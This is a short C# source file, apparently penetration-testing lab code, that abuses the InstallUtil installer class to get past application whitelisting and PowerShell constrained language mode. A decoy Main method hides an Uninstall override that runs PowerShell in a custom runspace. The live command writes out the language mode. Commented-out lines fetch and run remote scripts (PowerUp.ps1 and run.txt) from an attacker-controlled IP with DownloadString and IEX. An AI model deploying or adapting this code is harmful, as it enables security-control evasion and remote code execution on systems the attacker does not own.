using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {

            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Windows\\Tasks\\test.txt";
            // String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.233/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath .\\tc.txt"; //Just Invoke-Allchecks with Powerup and writes a file.
            // String cmd = "try { (New-Object System.Net.WebClient).DownloadString('http://192.168.45.233/run.txt') | IEX } catch { $_ | Format-List * -Force | Out-String | Out-File -FilePath .\\exc.txt}"; // Downloads run.txt and runs, if catches any exception, writes in to exc.txt.
            
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
